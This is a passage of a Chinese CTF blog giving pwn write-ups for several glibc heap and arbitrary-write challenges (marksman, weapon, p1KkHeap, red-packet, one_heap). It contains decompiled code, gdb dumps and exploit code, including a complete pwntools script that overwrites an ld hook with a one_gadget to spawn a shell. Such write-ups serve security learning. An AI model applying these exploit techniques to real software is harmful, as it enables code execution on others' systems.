class="built_in">printf</span>(<span class="string">&quot;I placed the target near: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;shoot!shoot!&quot;</span>);</span><br><span class="line">  v6 = sub_B78();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;biang!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v7[i], <span class="number">1uLL</span>);</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_BC2(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )                  <span class="comment">// 任意地址写三个字节</span></span><br><span class="line">      *(j + v6) = v7[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !dlopen(<span class="number">0LL</span>, <span class="number">1</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>sub_B78()</code>函数中用<code>atol</code>函数返回了一个长整型，所以题目整体来说就是给了一个三个字节的任意地址写，而且程序一开始还给了libc</p>
<p>但是程序也有一点限制，在<code>sub_BC2(v7)</code>中限制了一些任意写的字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_BC2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (*a1 != <span class="number">0xC5</span> || a1[<span class="number">1</span>] != <span class="number">0xF2</span>) &amp;&amp; (*a1 != <span class="number">0x22</span> || a1[<span class="number">1</span>] != <span class="number">0xF3</span>) &amp;&amp; *a1 != <span class="number">0x8C</span> &amp;&amp; a1[<span class="number">1</span>] != <span class="number">0xA3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You always want a Gold Finger!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这些字节其实就是部分one_gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先找到<code>_rtld_global</code>结构体于libc基址的偏移，要注意<code>_rtld_global</code>是在ld中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7fee9af22060 &lt;_rtld_global&gt;</span><br></pre></td></tr></table></figure>

<p>然后找<code>__rtld_lock_unlock_recursive</code>于<code>_rtld_global</code>的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _rtld_global</span><br><span class="line">...</span><br><span class="line">audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0x0, </span><br><span class="line">      bindflags = 0x0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;, </span><br><span class="line">  _dl_rtld_lock_recursive = 0x7fee9acfb0e0 &lt;rtld_lock_default_lock_recursive&gt;, </span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7fee9acfb0f0 &lt;rtld_lock_default_unlock_recursive&gt;, </span><br><span class="line">  _dl_make_stack_executable_hook = 0x7fee9ad0dd00 &lt;__GI__dl_make_stack_executable&gt;, </span><br><span class="line">  _dl_stack_flags = 0x6, </span><br><span class="line">  _dl_tls_dtv_gaps = 0x0, </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fee9af22f60 &lt;_rtld_global+3840&gt;:	0x00007fee9acfb0e0	0x00007fee9acfb0f0</span><br></pre></td></tr></table></figure>

<p>一般来说偏移会在<code>3840</code>上下</p>
<p>得到这两个偏移后就可以开始写入了，这时回到写入字节的限制，一般有两种方法：1.在one_gadget命令中加上<code>-l num</code>参数，这个参数会将一些不那么容易满足条件的one_gadget也显示出来，可以试一下这些。2.查看最初的几个one_gadget地址中往上的几条命令，看看有没有不影响程序最后执行的命令，如果有的话就可以以这个地址为one_gadget的起点从而绕过写入字节的限制。</p>
<p>比如说这题，我们查看偏移为<code>0x10a38c</code>的one_gadget上面的几条命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fb239510379 &lt;exec_comm+2489&gt;:	cmp    eax,0xab39a</span><br><span class="line">0x7fb23951037e &lt;exec_comm+2494&gt;:	call   0x7fb239448cb0 &lt;__unsetenv&gt;</span><br><span class="line">0x7fb239510383 &lt;exec_comm+2499&gt;:	mov    edi,DWORD PTR [rsp+0x68]</span><br><span class="line">0x7fb239510387 &lt;exec_comm+2503&gt;:	call   0x7fb2395168c0 &lt;__GI___close&gt;</span><br><span class="line">0x7fb23951038c &lt;exec_comm+2508&gt;:	mov    rax,QWORD PTR [rip+0x2e0b15]        #one_gadget的起点</span><br><span class="line">0x7fb239510393 &lt;exec_comm+2515&gt;:	lea    rsi,[rsp+0x70]</span><br><span class="line">0x7fb239510398 &lt;exec_comm+2520&gt;:	lea    rdi,[rip+0xa9afb]</span><br><span class="line">0x7fb23951039f &lt;exec_comm+2527&gt;:	mov    rdx,QWORD PTR [rax]</span><br><span class="line">0x7fb2395103a2 &lt;exec_comm+2530&gt;:	call   0x7fb2394eae30 &lt;execve&gt;</span><br></pre></td></tr></table></figure>

<p>发现<code>0x10a38c</code>上面的一条命令是<code>call close</code>，这条命令应该不会影响程序最后的执行，所以我们以<code>0x10a387</code>为one_gadget的起点，这样就饶过了写入字节的限制。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hfctf_2020_marksman&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - (<span class="number">0x7fe027d2e9c0</span> - <span class="number">0x00007fe027cae000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rtld_global = libc_base + <span class="number">8507488</span></span><br><span class="line">addr = rtld_global + <span class="number">3840</span></span><br><span class="line">og = libc_base + <span class="number">0x10a387</span></span><br><span class="line">a = og&amp;<span class="number">0xff</span></span><br><span class="line">b = (og&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">c = (og&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(a))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(b))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(c))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>经过调试发现劫持<code>__rtld_lock_lock_recursive</code>或者<code>__rtld_lock_unlock_recursive</code>最后都能执行<code>one_gadget</code>，但是劫持<code>__rtld_lock_unlock_recursive</code>时就是拿不到shell，可能是执行这两个函数时栈环境不太一样导致的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">刷题记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-06-10 16:19:13" itemprop="dateCreated datePublished" datetime="2022-06-10T16:19:13+08:00">2022-06-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-07 11:05:29" itemprop="dateModified" datetime="2022-10-07T11:05:29+08:00">2022-10-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h3><h5 id="版本：glibc-2-23"><a href="#版本：glibc-2-23" class="headerlink" title="版本：glibc-2.23"></a>版本：glibc-2.23</h5><h5 id="漏洞：UAF"><a href="#漏洞：UAF" class="headerlink" title="漏洞：UAF"></a>漏洞：UAF</h5><h5 id="限制：malloc最大大小为0x60，没有泄漏点"><a href="#限制：malloc最大大小为0x60，没有泄漏点" class="headerlink" title="限制：malloc最大大小为0x60，没有泄漏点"></a>限制：malloc最大大小为0x60，没有泄漏点</h5><p>① 利用UAF在一个fast chunk前申请一个chunk，用来改这个fast bin的size字段，使其free掉之后能进到unsorted bin里（绕过0x60的限制）</p>
<p>② 因为肯定要打stdout，而且2.23没有tcache，所以前面布置的chunk大小要合理，例如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,p64(<span class="number">0x41</span>)*<span class="number">6</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#padding</span></span><br></pre></td></tr></table></figure>

<p>利用chunk0来伪造size字段，然后在chunk1前面申请出一个chunk来改chunk1的size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\x30&#x27;</span>)	<span class="comment">#部分覆写chunk1的fd指针，把fake chunk拿出来</span></span><br><span class="line">add(-<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(-<span class="number">1</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>))	<span class="comment">#fake chunk改chunk1的size</span></span><br></pre></td></tr></table></figure>

<p>这里将chunk1的size改成0xb1就把chunk2也包含了进去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)	<span class="comment">#free掉大chunk</span></span><br><span class="line">free(<span class="number">2</span>)	<span class="comment">#提前把chunk2 free到fast bin</span></span><br><span class="line">add(-<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#把chunk1拿出来，这样unsorted bin的指针就留在了chunk2里</span></span><br></pre></td></tr></table></figure>

<p>如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555758080 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758080</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758080 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758080</span><br></pre></td></tr></table></figure>

<p>这样就可以部分覆写chunk2来打stdout，同时<code>_IO_2_1_stdout</code>上面也有可用数据，能从fast bin里拿出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0xfbad1800)+p64(0)*3+b&quot;\x58&quot;</span><br></pre></td></tr></table></figure>

<h3 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a>SWPUCTF_2019_p1KkHeap</h3><h5 id="版本：glibc-2-27"><a href="#版本：glibc-2-27" class="headerlink" title="版本：glibc-2.27"></a>版本：glibc-2.27</h5><h5 id="漏洞：UAF（因为题目的限制，这个UAF不能直接用来编辑）"><a href="#漏洞：UAF（因为题目的限制，这个UAF不能直接用来编辑）" class="headerlink" title="漏洞：UAF（因为题目的限制，这个UAF不能直接用来编辑）"></a>漏洞：UAF（因为题目的限制，这个UAF不能直接用来编辑）</h5><h5 id="限制：malloc最大大小为0x100，全部菜单操作加起来最多18次，最多free-3次"><a href="#限制：malloc最大大小为0x100，全部菜单操作加起来最多18次，最多free-3次" class="headerlink" title="限制：malloc最大大小为0x100，全部菜单操作加起来最多18次，最多free 3次"></a>限制：malloc最大大小为0x100，全部菜单操作加起来最多18次，最多free 3次</h5><h5 id="菜单功能：add、show、edit、delete"><a href="#菜单功能：add、show、edit、delete" class="headerlink" title="菜单功能：add、show、edit、delete"></a>菜单功能：add、show、edit、delete</h5><p>在glibc-2.27中是没有对tcache增加double free检查的，所以在该版本可以直接在tcache中构造double free</p>
<p>这题的主要考点在于打那个0x250大小的储存tcache信息的结构体，这个结构体里面储存有每一个对应大小的tcache链表中<strong>chunk的数量</strong>，以及每一条tcache链表的<strong>链表头</strong>，也就是说如果我们能够直接修改这个结构体的话，就可以直接伪造上述的两个东西，例如将某一条链中chunk的数量改满，或者直接将某一个地址放到一个tcache链的链表头中，这样就能直接将这个地址申请出来。</p>
<h4 id="详细一点"><a href="#详细一点" class="headerlink" title="详细一点"></a>详细一点</h4><p>首先经过下面操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#double free</span></span><br></pre></td></tr></table></figure>

<p>那么tcache bin如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  2]: 0x55f64cc13260 ◂— 0x55f64cc13260</span><br></pre></td></tr></table></figure>

<p>此时查看tcache结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55f64cc13000</span><br><span class="line">0x55f64cc13000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x55f64cc13010:	0x0000000000000000	0x0200000000000000		#最高一字节存储数量</span><br><span class="line">0x55f64cc13020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc13090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc130a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc130b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f64cc130c0:	0x0000000000000000	0x000055f64cc13260		#size = 0x110 tcache bin的链表头</span><br><span class="line">0x55f64cc130d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>如果我们将<code>0x55f64cc1301f</code>的值改成7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x55f64cc13260 ◂— 0x55f64cc13260</span><br></pre></td></tr></table></figure>

<p>如果我们将<code>0x55f64cc130c0</code>的链表头地址改成<code>__malloc_hook</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x7f061d061c30 (__malloc_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>就是如上效果</p>
<h3 id="buuoj-2020-新春红包题-3"><a href="#buuoj-2020-新春红包题-3" class="headerlink" title="buuoj [2020 新春红包题]3"></a>buuoj [2020 新春红包题]3</h3><h5 id="版本：glibc-2-29"><a href="#版本：glibc-2-29" class="headerlink" title="版本：glibc-2.29"></a>版本：glibc-2.29</h5><h5 id="漏洞：UAF-1"><a href="#漏洞：UAF-1" class="headerlink" title="漏洞：UAF"></a>漏洞：UAF</h5><h5 id="考点：tcache-stashing-unlink-attack"><a href="#考点：tcache-stashing-unlink-attack" class="headerlink" title="考点：tcache stashing unlink attack"></a>考点：tcache stashing unlink attack</h5><h5 id="菜单功能：add、show、edit、delete-1"><a href="#菜单功能：add、show、edit、delete-1" class="headerlink" title="菜单功能：add、show、edit、delete"></a>菜单功能：add、show、edit、delete</h5><p>这题提供了一个后门函数，但前提是要往一个地址中写入一个大值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_13BD</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(qword_4058 + <span class="number">0x800</span>) &lt;= <span class="number">0x7F0000000000</span>LL || *(qword_4058 + <span class="number">0x7F8</span>) || *(qword_4058 + <span class="number">0x808</span>) )</span><br><span class="line">    end();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get red packet!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you want to say?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x90</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时add功能函数使用calloc来分配四种固定大小的堆</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): &quot;</span>);</span><br><span class="line">v3 = read_choice();</span><br></pre></td></tr></table></figure>

<p>首先塞满0x410大小的tcache bin，使得下一个0x410的chunk能进入unsorted bin，同时在0x100大小的tcache bin中填充6个chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#full 0x410 tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#0x100 tcache bin =&gt; 6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>然后利用last remainder不会进入tcache的这一点向small bin中塞入两个chunk，这个过程中值得注意的是：第一个chunk被放入small bin之后要注意后面申请的块的大小一定要大于small bin中的这个chunk，否则就会将这个small bin chunk取出来了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#padding</span></span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#into unsorted bin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#last remainder == 0x100</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#last remainder into smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#again</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#padding</span></span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#into unsorted bin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#last remainder == 0x100</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#last remainder into smallbin</span></span><br></pre></td></tr></table></figure>

<p>然后修改第二个进入small bin的chunk的bk指针为目标地址-0x10，最后从这个small bin中申请出一个块即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x300</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(heap_base + <span class="number">0x37e0</span>) + p64(heap_base + <span class="number">0x260</span> + <span class="number">0x800</span> - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a>sctf_2019_one_heap</h3><h5 id="版本：glibc-2-27-1"><a href="#版本：glibc-2-27-1" class="headerlink" title="版本：glibc-2.27"></a>版本：glibc-2.27</h5><h5 id="漏洞：UAF-2"><a href="#漏洞：UAF-2" class="headerlink" title="漏洞：UAF"></a>漏洞：UAF</h5><h5 id="考点：partial-write、stdout泄漏libc，tcache-struct"><a href="#考点：partial-write、stdout泄漏libc，tcache-struct" class="headerlink" title="考点：partial write、stdout泄漏libc，tcache struct"></a>考点：partial write、stdout泄漏libc，tcache struct</h5><h5 id="菜单：add、delete"><a href="#菜单：add、delete" class="headerlink" title="菜单：add、delete"></a>菜单：add、delete</h5><h5 id="限制：malloc的值小于0x7f，只能delete四次、add十五次，只有一个堆指针"><a href="#限制：malloc的值小于0x7f，只能delete四次、add十五次，只有一个堆指针" class="headerlink" title="限制：malloc的值小于0x7f，只能delete四次、add十五次，只有一个堆指针"></a>限制：malloc的值小于0x7f，只能delete四次、add十五次，只有一个堆指针</h5><p>2.27这个版本有点奇怪，似乎在一些小版本中没有加入tcache的double free检查，同时tcache counts的值为负数时仍然可以从中取出chunk，而另一些小版本中则加入了。同时这题的小版本是可以double free的那种。</p>
<p>因为可以直接double free，所以可以在没有edit的情况下改掉tcache的next指针，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x78,&#x27;aaa&#x27;)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(0x78,&#x27;\x60&#x27;)</span><br></pre></td></tr></table></figure>

<p>那么此时0x80的tcache bin就是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x90 [  1]: 0x55c6f6a88260 ◂— 0x55c6f6a88260</span><br></pre></td></tr></table></figure>

<p>那么把这个chunk拿出来的同时再改其fd即可</p>
